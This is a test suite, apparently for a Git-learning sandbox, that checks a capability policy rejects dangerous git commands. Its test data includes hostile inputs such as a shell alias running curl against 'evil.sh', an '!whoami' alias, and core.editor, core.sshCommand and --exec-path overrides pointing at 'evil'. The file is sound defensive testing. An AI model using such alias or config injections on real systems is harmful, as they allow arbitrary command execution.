import { describe, expect, test } from "bun:test";
import {
  type CapabilityPolicy,
  enforcePolicy,
  OPEN_POLICY,
  PolicyViolation,
} from "../../src/git/capability_policy";
import { parseGitCommand } from "../../src/git/command_parser";

const STAGING_POLICY: CapabilityPolicy = { commands: ["status", "diff", "add"] };
const CONFIG_POLICY: CapabilityPolicy = {
  commands: ["config", "status", "log"],
  config: { allowedKeys: ["alias.st", "user.name"], allowedScopes: ["global"] },
};

describe("enforcePolicy", () => {
  test("允许关卡开放的命令", () => {
    expect(() => enforcePolicy(parseGitCommand("git add README.md"), STAGING_POLICY)).not.toThrow();
  });

  test("拒绝关卡未开放的命令", () => {
    expect(() => enforcePolicy(parseGitCommand("git push origin main"), STAGING_POLICY)).toThrow(
      PolicyViolation,
    );
  });

  test("拒绝 -C", () => {
    expect(() => enforcePolicy(parseGitCommand("git add -C /tmp file"), OPEN_POLICY)).toThrow(
      PolicyViolation,
    );
  });

  test("拒绝 -c", () => {
    expect(() =>
      enforcePolicy(parseGitCommand("git status -c core.editor=evil"), OPEN_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("拒绝 --git-dir", () => {
    expect(() =>
      enforcePolicy(parseGitCommand("git status --git-dir=/other/.git"), OPEN_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("拒绝 --work-tree", () => {
    expect(() =>
      enforcePolicy(parseGitCommand("git status --work-tree /other"), OPEN_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("拒绝 --exec-path", () => {
    expect(() =>
      enforcePolicy(parseGitCommand("git status --exec-path=/evil"), OPEN_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("拒绝危险子命令 daemon", () => {
    expect(() => enforcePolicy(parseGitCommand("git daemon --export-all"), OPEN_POLICY)).toThrow(
      PolicyViolation,
    );
  });

  test("拒绝 shell alias 配置", () => {
    expect(() =>
      enforcePolicy(parseGitCommand("git config alias.pwn=!curl evil.sh"), OPEN_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("拒绝分离参数形式的 shell alias", () => {
    expect(() =>
      enforcePolicy(parseGitCommand('git config --global alias.st "!whoami"'), CONFIG_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("别名只能指向当前关卡允许的真实 Git 子命令", () => {
    expect(() =>
      enforcePolicy(parseGitCommand("git config --global alias.st status"), CONFIG_POLICY),
    ).not.toThrow();
    expect(() =>
      enforcePolicy(parseGitCommand("git config --global alias.st push"), CONFIG_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("拒绝白名单外的配置写入与文件选择器", () => {
    expect(() =>
      enforcePolicy(parseGitCommand("git config --global core.editor evil"), CONFIG_POLICY),
    ).toThrow(PolicyViolation);
    expect(() =>
      enforcePolicy(parseGitCommand("git config --file=outside user.name learner"), CONFIG_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("拒绝 core.sshCommand 配置", () => {
    expect(() =>
      enforcePolicy(parseGitCommand("git config core.sshCommand evil"), OPEN_POLICY),
    ).toThrow(PolicyViolation);
  });

  test("允许普通 config 练习", () => {
    expect(() =>
      enforcePolicy(parseGitCommand('git config --global user.name "学习者"'), OPEN_POLICY),
    ).not.toThrow();
  });
});
